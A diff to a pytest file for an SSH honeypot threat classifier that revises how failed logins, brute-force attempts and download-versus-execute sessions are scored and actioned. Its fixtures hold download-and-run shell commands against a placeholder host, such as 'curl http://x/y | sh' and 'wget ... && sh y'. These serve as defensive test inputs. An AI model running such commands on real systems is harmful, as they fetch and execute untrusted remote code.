@@ -16,8 +16,14 @@ from utils.features import classify_honeypot_session  # noqa: E402
 MODEL_DIR = Path(__file__).resolve().parent.parent / "models"
 
 SESSIONS = {
-    "failed_login": ({"loginSucceeded": False, "commands": [], "durationSeconds": 4}, "SSH Brute Force", "MONITOR"),
-    "login_no_commands": ({"loginSucceeded": True, "commands": [], "durationSeconds": 10}, "Port Scan", "ALLOW"),
+    # H4: one wrong password is an intrusion attempt; brute force needs BRUTE_FORCE_MIN_FAILURES per source
+    "failed_login": ({"loginSucceeded": False, "commands": [], "durationSeconds": 4}, "SSH Intrusion Attempt", "ALLOW"),
+    "brute_force_session": ({"loginSucceeded": False, "commands": [], "failedLogins": 5}, "SSH Brute Force", "MONITOR"),
+    "brute_force_per_source": ({"loginSucceeded": False, "commands": [], "failedLogins": 1, "recentFailedLogins": 4},
+                               "SSH Brute Force", "MONITOR"),
+    # M6: logged in and ran nothing is not a port scan
+    "login_no_commands": ({"loginSucceeded": True, "commands": [], "durationSeconds": 10},
+                          "SSH Intrusion Attempt", "ALLOW"),
     "download_execute": ({"loginSucceeded": True, "durationSeconds": 60,
                           "commands": [{"command": "wget http://x/y.sh"}, {"command": "chmod +x y.sh"}]},
                          "RCE Attempt", "BLOCK"),
@@ -91,7 +97,7 @@ def test_verdict_comes_from_rules_without_running_models(name):
 
 def test_attack_classes_reach_alert_line_and_benign_does_not():
     for cls, score in HONEYPOT_RULE_SCORES.items():
-        if cls in ("BENIGN", "Port Scan"):
+        if cls in ("BENIGN", "Port Scan", "SSH Intrusion Attempt"):
             assert score < MONITOR_THRESHOLD, cls
         else:
             assert score >= MONITOR_THRESHOLD, cls
@@ -101,12 +107,27 @@ def test_attack_classes_reach_alert_line_and_benign_does_not():
 
 def test_commands_raise_attack_score_up_to_cap_but_not_benign():
     p = model_free_predictor()
-    many = [{"command": "wget http://x/y"}] * 200
+    many = [{"command": "wget http://x/y && sh y"}] * 200
     assert p.predict_from_honeypot({"loginSucceeded": True, "commands": many})["threatScore"] == 0.99
     harmless = {"loginSucceeded": True, "commands": [{"command": "ls"}] * 50}
     assert p.predict_from_honeypot(harmless)["threatScore"] == HONEYPOT_RULE_SCORES["BENIGN"]
     two = SESSIONS["download_execute"][0]
     assert p.predict_from_honeypot(two)["threatScore"] == pytest.approx(HONEYPOT_RULE_SCORES["RCE Attempt"] + 0.02)
+
+
+@pytest.mark.parametrize("commands", [["wget http://x/y"], ["cd /tmp", "curl -O http://x/y"] * 30])
+def test_download_without_execution_is_rce_but_stays_under_the_block_line(commands):
+    """M6: a fetched file that is never run is alerted (MONITOR), not auto-blocked."""
+    res = model_free_predictor().predict_from_honeypot(_logged_in(*commands))
+    assert res["predictedClass"] == "RCE Attempt"
+    assert MONITOR_THRESHOLD <= res["threatScore"] < BLOCK_THRESHOLD
+    assert res["action"] == "MONITOR"
+
+
+@pytest.mark.parametrize("commands", [["wget http://x/y", "chmod +x y"], ["curl http://x/y | sh"], ["wget x", "./y"]])
+def test_download_and_execution_reaches_the_block_line(commands):
+    res = model_free_predictor().predict_from_honeypot(_logged_in(*commands))
+    assert res["predictedClass"] == "RCE Attempt" and res["threatScore"] >= BLOCK_THRESHOLD
 
 
 def test_unloaded_engine_still_fails_closed(tmp_path):
@@ -118,7 +139,8 @@ def test_internal_endpoint_returns_rule_verdict():
     from inference.main import app
     with patch("inference.main.predictor", model_free_predictor()):
         r = TestClient(app).post("/predict/honeypot/internal", headers={"X-API-Key": os.environ["SENTINEL_KEY"]},
-                                 json={"sessionId": "s1", "sourceIP": "203.0.113.5", "loginSucceeded": False})
+                                 json={"sessionId": "s1", "sourceIP": "203.0.113.5", "loginSucceeded": False,
+                                       "failedLogins": 2, "recentFailedLogins": 3})
     assert r.status_code == 200
     body = r.json()["result"]
     assert body["predictedClass"] == "SSH Brute Force" and body["action"] == "MONITOR"
@@ -130,7 +152,7 @@ def test_registered_models_no_longer_turn_attackers_benign():
     p = SentinelPredictor(model_dir=str(MODEL_DIR))
     if not p._loaded:
         pytest.skip("registered models did not load in this environment")
-    for name in ("failed_login", "download_execute", "recon", "exfiltration"):
+    for name in ("brute_force_session", "download_execute", "recon", "exfiltration"):
         session, expected, _ = SESSIONS[name]
         res = p.predict_from_honeypot(session)
         assert res["predictedClass"] == expected != "BENIGN"
